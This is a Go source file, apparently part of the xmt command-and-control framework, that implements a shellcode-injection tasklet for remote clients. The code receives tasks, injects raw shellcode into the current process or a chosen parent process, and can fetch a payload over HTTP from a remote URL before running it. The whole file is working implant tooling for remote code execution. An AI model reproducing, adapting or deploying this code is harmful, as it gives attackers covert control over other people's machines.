package task

import (
	"context"
	"io/ioutil"
	"net/http"
	"strings"
	"time"
	"unsafe"

	"github.com/iDigitalFlame/xmt/cmd"
	"github.com/iDigitalFlame/xmt/com"
	"github.com/iDigitalFlame/xmt/data"
)

// Inject represents the code injection Tasklet. This can be used to instruct a client to
// execute shellcode.
const Inject = code(0xC4)

type code uint8

// Code is a struct that is similar to the 'cmd.Code' struct. This is used to Task a Client with running shellcode
// on devices. This struct has many of the functionallies of the standard 'cmd.Code' function. The
// 'SetParent' function will attempt to set the target that runs the shellcode. If none are specified, the shellcode
// will be injected into the current process.
type Code struct {
	Filter *cmd.Filter

	Path string
	Data []byte

	Timeout time.Duration
	Wait    bool
}

func (code) Thread() bool {
	return true
}
func (code) Run(c *Code) *com.Packet {
	v := &com.Packet{ID: TvCode}
	c.MarshalStream(v)
	return v
}
func (code) Raw(b []byte) *com.Packet {
	return Inject.Run(&Code{Data: b})
}
func (code) RemotePath(s string) *com.Packet {
	return Inject.Run(&Code{Path: s})
}

// MarshalStream writes the data for this Code thread to the supplied Writer.
func (c Code) MarshalStream(w data.Writer) error {
	if err := w.WriteBool(c.Wait); err != nil {
		return err
	}
	if err := w.WriteUint64(uint64(c.Timeout)); err != nil {
		return err
	}
	if err := w.WriteString(c.Path); err != nil {
		return err
	}
	if err := w.WriteBool(c.Filter != nil); err != nil {
		return err
	}
	if c.Filter != nil {
		if err := c.Filter.MarshalStream(w); err != nil {
			return err
		}
	}
	if err := w.WriteBytes(c.Data); err != nil {
		return err
	}
	return nil
}

// UnmarshalStream reads the data for this Code thread from the supplied Reader.
func (c *Code) UnmarshalStream(r data.Reader) error {
	if err := r.ReadBool(&c.Wait); err != nil {
		return err
	}
	if err := r.ReadUint64((*uint64)(unsafe.Pointer(&c.Timeout))); err != nil {
		return err
	}
	if err := r.ReadString(&c.Path); err != nil {
		return err
	}
	f, err := r.Bool()
	if err != nil {
		return err
	}
	if f {
		c.Filter = new(cmd.Filter)
		if err = c.Filter.UnmarshalStream(r); err != nil {
			return err
		}
	}
	if c.Data, err = r.Bytes(); err != nil {
		return err
	}
	return nil
}
func (code) LocalFile(s string) (*com.Packet, error) {
	b, err := ioutil.ReadFile(s)
	if err != nil {
		return nil, err
	}
	return Inject.Raw(b), nil
}
func (code) Do(x context.Context, p *com.Packet) (*com.Packet, error) {
	var c Code
	if err := c.UnmarshalStream(p); err != nil {
		return nil, err
	}
	var z *cmd.Code
	if len(c.Path) > 0 {
		b, err := external(x, c.Timeout, c.Path)
		if err != nil {
			return nil, err
		}
		z = cmd.NewCodeContext(x, b)
	} else {
		z = cmd.NewCodeContext(x, c.Data)
	}
	z.Timeout = c.Timeout
	z.SetParent(c.Filter)
	if err := z.Start(); err != nil {
		return nil, err
	}
	var (
		w    = new(com.Packet)
		h, _ = z.Handle()
	)
	if w.WriteUint64(uint64(h)); !c.Wait {
		w.WriteInt32(0)
		return w, nil
	}
	err := z.Wait()
	if _, ok := err.(*cmd.ExitError); err != nil && !ok {
		w.Clear()
		return nil, err
	}
	e, _ := z.ExitCode()
	w.WriteInt32(e)
	return w, nil
}
func external(x context.Context, d time.Duration, s string) ([]byte, error) {
	if strings.HasPrefix(s, "http") {
		var (
			c, f = context.WithTimeout(x, d)
			r, _ = http.NewRequestWithContext(c, http.MethodGet, s, nil)
		)
		o, err := http.DefaultClient.Do(r)
		if err != nil {
			f()
			return nil, err
		}
		b, err := ioutil.ReadAll(o.Body)
		o.Body.Close()
		if f(); err != nil {
			return nil, err
		}
		return b, nil
	}
	return ioutil.ReadFile(s)
}
